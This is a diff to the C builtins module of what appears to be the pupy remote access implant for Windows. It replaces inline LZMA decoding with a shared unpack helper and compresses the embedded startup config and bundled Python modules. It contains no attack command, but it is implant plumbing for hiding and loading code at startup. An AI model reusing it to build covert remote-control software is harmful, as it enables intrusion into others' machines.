@@ -6,72 +6,39 @@
 #include "Python-dynload.h"
 #include <stdio.h>
 #include <windows.h>
-#include "LzmaDec.h"
 #include "base_inject.h"
 static char module_doc[] = "Builtins utilities for pupy";
 
-extern const char resources_library_compressed_string_txt_start[];
-extern const int resources_library_compressed_string_txt_size;
-char pupy_config[40960]="####---PUPY_CONFIG_COMES_HERE---####\n"; //big array to have space for more config / code run at startup
+char pupy_config[8192]="####---PUPY_CONFIG_COMES_HERE---####\n"; //big array to have space for more config / code run at startup
 extern const DWORD dwPupyArch;
 
-static void *_lzalloc(void *p, size_t size) { p = p; return malloc(size); }
-static void _lzfree(void *p, void *address) { p = p; free(address); }
-ISzAlloc _lzallocator = { _lzalloc, _lzfree };
+#include "resources_library_compressed_string_txt.c"
+#include "lzmaunpack.c"
 
 static PyObject *Py_get_modules(PyObject *self, PyObject *args)
 {
-	char *uncompressed = NULL;
-	size_t uncompressed_size = 0;
-	PyObject * modules;
-
-	const Byte *wheader = resources_library_compressed_string_txt_start + sizeof(unsigned int);
-	const Byte *woheader = wheader + LZMA_PROPS_SIZE;
-
-	CLzmaDec state;
-	ELzmaStatus status;
-	size_t srcLen;
-	int res;
-
-	union {
-		unsigned int l;
-		unsigned char c[4];
-	} x;
-
-	x.c[3] = resources_library_compressed_string_txt_start[0];
-	x.c[2] = resources_library_compressed_string_txt_start[1];
-	x.c[1] = resources_library_compressed_string_txt_start[2];
-	x.c[0] = resources_library_compressed_string_txt_start[3];
-
-	uncompressed_size = x.l;
-
-	uncompressed = malloc(uncompressed_size);
-	if (!uncompressed) {
-		abort();
-	}
-
-	srcLen = resources_library_compressed_string_txt_size - sizeof(unsigned int) - LZMA_PROPS_SIZE;
-
-	res = LzmaDecode(
-		uncompressed, &uncompressed_size, woheader, &srcLen, wheader,
-		LZMA_PROPS_SIZE, LZMA_FINISH_ANY, &status, &_lzallocator
+	return PyObject_lzmaunpack(
+		resources_library_compressed_string_txt_start,
+		resources_library_compressed_string_txt_size
 	);
-
-	if (res != SZ_OK) {
-		abort();
-	}
-
-	modules = PyMarshal_ReadObjectFromString(
-		uncompressed, uncompressed_size);
-
-	free(uncompressed);
-	return modules;
 }
 
 static PyObject *
 Py_get_pupy_config(PyObject *self, PyObject *args)
 {
-	return Py_BuildValue("s", pupy_config);
+	union {
+		unsigned int l;
+		unsigned char c[4];
+	} len;
+
+	char *uncompressed;
+
+	len.c[3] = pupy_config[0];
+	len.c[2] = pupy_config[1];
+	len.c[1] = pupy_config[2];
+	len.c[0] = pupy_config[3];
+
+	return PyObject_lzmaunpack(pupy_config+sizeof(int), len.l);
 }
 
 static PyObject *Py_get_arch(PyObject *self, PyObject *args)
